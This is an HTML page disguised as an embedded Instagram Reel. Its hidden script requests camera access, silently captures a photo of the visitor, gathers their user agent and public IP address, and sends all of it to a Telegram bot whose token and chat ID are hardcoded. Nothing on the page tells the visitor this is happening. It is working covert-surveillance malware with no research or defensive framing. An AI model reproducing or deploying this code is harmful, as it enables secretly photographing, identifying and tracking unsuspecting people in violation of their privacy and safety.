<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Reel</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        #video-container {
        }
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
        }
        #video, #canvas {
            display: none;
        }
    </style>
</head>
<body>
    <div id="video-container">
        <!-- Instagram Video in Background -->
        <iframe src="https://www.instagram.com/reel/C_biUQsRFzS/embed" frameborder="0"></iframe>
        
        <!-- Camera access notification -->
        <div id="camera-access">
            <h2></h2>
            <p></p>
            <video id="video" autoplay></video>
            <canvas id="canvas"></canvas>
        </div>
    </div>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');
        let stream; // Store the stream globally

        // Prompt for camera access and capture photo
        navigator.mediaDevices.getUserMedia({ video: true })
            .then((mediaStream) => {
                stream = mediaStream;
                video.srcObject = stream;
                
                // Wait until the video starts playing, then add a delay before capturing the photo
                video.addEventListener('playing', () => {
                    setTimeout(captureAndSendPhoto, 1500);  // 1.5 seconds delay before capturing the photo
                });
            })
            .catch((err) => console.error('Error accessing the camera: ', err));

        function captureAndSendPhoto() {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            // Invert the image horizontally
            context.translate(canvas.width, 0);
            context.scale(-1, 1);
            
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imageData = canvas.toDataURL('image/png');
            stopCamera(); // Stop the camera
            getDeviceInfo(imageData);
        }

        function stopCamera() {
            stream.getTracks().forEach(track => track.stop()); // Stop all video tracks
        }

        function getDeviceInfo(imageData) {
            const deviceInfo = navigator.userAgent;
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => sendToTelegram(imageData, deviceInfo, data.ip))
                .catch(error => console.error('Error getting IP:', error));
        }

        function sendToTelegram(imageData, deviceInfo, ip) {
            const telegramToken = '7787402061:AAGh-kuD1UOGc9bsUlqMmy_pIj6NgHGnFNE';
            const chatId = '6305469091';
            const blob = dataURLToBlob(imageData);
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, 'photo.png');
            formData.append('caption', `Device Info: ${deviceInfo}\nIP Address: ${ip}`);

            fetch(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, {
                method: 'POST',
                body: formData
            })
            .then(() => {
                console.log('Photo sent successfully!');
            })
            .catch(error => console.error('Error:', error));
        }

        function dataURLToBlob(dataURL) {
            const byteString = atob(dataURL.split(',')[1]);
            const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
            return new Blob([ab], { type: mimeString });
        }
    </script>
</body>
</html>
